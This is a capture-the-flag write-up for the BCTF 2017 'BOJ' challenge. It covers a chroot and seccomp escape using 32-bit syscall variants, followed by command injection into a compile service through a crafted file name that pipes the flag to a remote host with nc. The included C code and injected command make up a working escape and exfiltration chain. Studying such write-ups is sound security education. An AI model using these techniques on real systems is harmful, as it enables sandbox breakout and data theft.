@@ -1,0 +1,165 @@
+---
+title: BCTF 2017 BOJ
+authors: Toshi Piazza
+date: 2017-04-19
+categories: binary-exploitation
+---
+
+This weekend we played in BCTF, though we took it a little easy in preparation for
+upcoming CTFs. However, we were able to solve a challenge with only one other solve, so we
+decided to write up our progress on it. It essentially boiled down to a sandbox escape.
+
+### Escaping the First Sandbox
+
+When we first go to the link in the problem description, we see a web form which
+presumably compiles and runs C code which we submit. Initially, it does not seem like we
+can get any output from the server other than "Compilation Error" or "Wrong Answer."
+However, it does not seem that there are many security restrictions on the binary; initial
+tests show that we can’t execve, but we can at least open a socket to create a writeback.
+First, we attempt to learn a bit more about our environment. In particular, we write our
+uid to our connect back. It seems we’re running as root! Let’s get a directory structure
+listing:
+
+```
+/etc/{group,passwd}
+/usr/sbin/chroot
+/usr/bin/{whoami,id}
+/lib64/ld-linux-x86-64.so.2
+/root/scf.so
+/root/1492329438123677.c.bin
+/lib/x86_64-linux-gnu/(lots of shared libs)
+/bin/{cp,mkdir,chmod,bash,cat,sh,ls}
+```
+
+At this point, we’re interested by a few things related to the directory structure; first,
+there’s no flag!? No sweat, we’re probably in a chroot (the flood of messages on IRC from
+people asking where the flag is confirms this theory). More alarming perhaps is the scf.so
+file that we see in the same directory as the file that was compiled for us. We dump it to
+our writeback, and immediately disassemble it.
+
+Initially, it’s apparent that this shared object file is meant to be used as an
+`LD_PRELOAD`; normal shared object files do not have a `__libc_start_main`. When we look
+deeper into this method, we notice immediately that it dlopen’s libc.so.6, and then pulls
+the real `__libc_start_main` for later. Then, it calls `prctl` in order to presumably
+construct some sort of impromptu seccomp filter. The call to prctl actually installs a
+Berkeley Packet Filter, as shown below. Upon disassembling it, we see that it blocks
+`execve`, `fork`, `ptrace`, `clone`, `chroot`, `pivot_root`, `process_vm_readv`, and
+`process_vm_writev`.  Finally, it calls the correct `__libc_start_main`, which eventually
+finds its way into our main function.
+
+```
+LD.W  ABS(0x4)
+JEQ 3221225534
+RET 0x0
+LD.W  ABS(0x0)
+JEQ !59
+RET 0x0
+JEQ !57
+RET 0x0
+JEQ !101
+RET 0x0
+JEQ !56
+RET 0x0
+JEQ !161
+RET 0x0
+JEQ !155
+RET 0x0
+JEQ !310
+RET 0x0
+JEQ !311
+RET 0x0
+RET 0x7fff0000
+```
+
+Clearly, our binary is being run with the given `__libc_start_main` via `LD_PRELOAD`. We
+also stipulate that we’re operating under a chroot! Naturally, we’d like to break out of
+the chroot. Normally, it’d be trivial to break out; since we’re root, we could simply
+create a new chroot, and use that to pivot out of the original chroot. However, there is a
+seccomp filter installed over chroot and friends, so maybe we can’t use the same trick.
+
+More [research](https://gist.github.com/thejh/c5b670a816bbb9791a6d) shows that this Berkley Packet Filter is not in fact
+bulletproof; it checks against the 64-bit syscalls, but fails to filter out the 32-bit
+variants, which we can access by or’ing the original syscall with 0x40000000. To test out
+this theory:
+
+```c
+printf("chroot\n");
+syscall(0x40000000 | SYS_chroot, ".foo");
+printf("success\n");
+```
+
+We see the success statement in our connect-back, so our program was not killed. This
+means that we successfully performed the chroot (barring return values). This means, we
+can escape the chroot by using the normal sandbox escape, but with the modified syscall.
+
+```c
+void change_root(void)
+{
+    mkdir(".42", 0755);
+    syscall(SYS_chroot | 0x40000000, ".42");
+    chdir(".42");
+    syscall(SYS_chroot | 0x40000000,
+            "../../../../../../../../../../../"
+            "../../../../../../../../../../../");
+}
+```
+
+Now, when we dump the filesystem from the root directory, we see an entire docker image
+with some interesting files. Specifically, we see
+
+```
+/flag
+/home/ctf/oj/sandbox/cr
+/home/ctf/oj/sandbox/sandbox
+/.dockerenv
+```
+
+First, we go straight for the flag; however, no matter how we try, we cannot seem to open
+the flag! It seems we do not have the proper permissions to open it, but presumably we’re
+root. What gives?
+
+### Escaping the Second Sandbox
+
+We dump the two binaries, `cr` and `sandbox` to reveal a little more about what’s going on
+here. The `cr` binary seems to be servicing files in a busy loop; as source files are
+dropped by the main service (specifically, in `/home/ctf/oj/src`), it compiles the files
+with gcc and then proceeds to run the sandbox binary with the path to the elf that was
+just compiled. Overall, the `cr` binary is not quite so interesting, as it doesn’t explain
+why we don’t have permission to open the flag.
+
+User namespaces effect the majority of the sandboxing done by the second binary, aptly
+named sandbox. In particular, it writes `0 <uid> 1` to `/proc/<fd>/uid_map`; this
+effectively gives us root within the namespace only, which is why we were able to break
+out of the chroot. This also explains why we do not have the permissions to read the flag
+file, owned by the host. Less interesting, the sandbox binary prepares the chroot, forks
+and cleans up the chroot after our program has exited or timed out.
+
+After all that, we still are no closer to reading the flag. However, it’s interesting to
+note that `cr` is running as a "service," effectively. It has effective permissions of the
+host, and presumably the flag natively exists in the host. So, we aim to trigger a
+vulnerability in `cr`; noting that `cr` compiles our code, effectively by passing the
+result of `sprintf(buffer, "gcc %s -o %s", source, binary)` directly to `system`, we drop
+a file in `/home/ctf/oj/src` which breaks out of the gcc command (i.e. with a semicolon).
+
+When we execute the following code, we end up with cr executing the following command:
+`gcc /home/ctf/oj/src/a;cat ???g | nc <redacted> 8000; garbage`, which sends the flag back
+to our connect-back, as intended. Note that it’s most likely sheer luck that `cr` is
+executing in the root directory, so the shell expansion works as expected. (We spent a few
+hours wondering why "cat /flag" wasn’t working, only to remember you can’t have a '/' in
+file names ;P)
+
+```c
+int main(void)
+{   /* break out of the chroot */
+    mkdir(".42", 0755);
+    syscall(SYS_chroot | 0x40000000, ".42");
+    chdir(".42");
+    syscall(SYS_chroot | 0x40000000,
+            "../../../../../../../../../../../"
+            "../../../../../../../../../../../");
+    /* fool cr into sending us the flag file */
+    fopen("/home/ctf/oj/src/a;cat ???g| nc <redacted> 8000;", "ab+");
+    return 0;
+}
+// flag: bctf{Y0u_4r3_7h3_exp0r7_0f_s4nd60x_6yp4551ng}
+```
